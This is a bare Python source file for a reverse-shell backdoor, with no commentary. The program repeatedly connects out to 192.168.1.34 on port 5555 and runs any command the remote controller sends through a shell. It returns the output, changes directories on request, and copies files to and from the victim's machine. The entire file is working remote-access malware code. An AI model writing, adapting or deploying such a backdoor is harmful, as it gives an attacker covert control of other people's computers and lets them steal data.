import socket
import time
import json
import subprocess
import os


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.34', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def download_file(filename):
    f = open(filename, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        try:
            f.write(chunk)
            chunk = s.recv(1024)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
